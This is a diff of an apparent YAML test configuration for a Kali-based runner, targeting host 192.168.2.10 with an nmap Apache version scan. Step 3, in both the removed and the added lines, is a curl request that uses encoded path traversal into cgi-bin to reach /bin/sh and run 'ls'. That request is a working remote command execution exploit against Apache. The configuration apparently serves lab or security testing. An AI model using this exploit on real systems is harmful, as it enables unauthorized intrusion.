@@ -152,20 +152,17 @@ action kali test $IP=10.0.0.5 $PORT=8080
 actions:
 
   test:
-
     1:
+      call: testping
+      #expected: Success
+    2:
       operator: AND
       1a:
         command: nmap -sV 192.168.2.10 | fgrep 'Apache' | awk '/open/'
         expected: Apache
-      1b: ["echo 'test kali'", "test kali"]
-
-    2:
-      call: testr2
-
+      1b: [echo 'test kali', test kali]
     3:
-      ["curl 'http://192.168.2.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo;ls'", bash]
-
+      [curl 'http://192.168.2.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo;ls', bash]
     4:
       command: echo 'OK'
       expected: OK
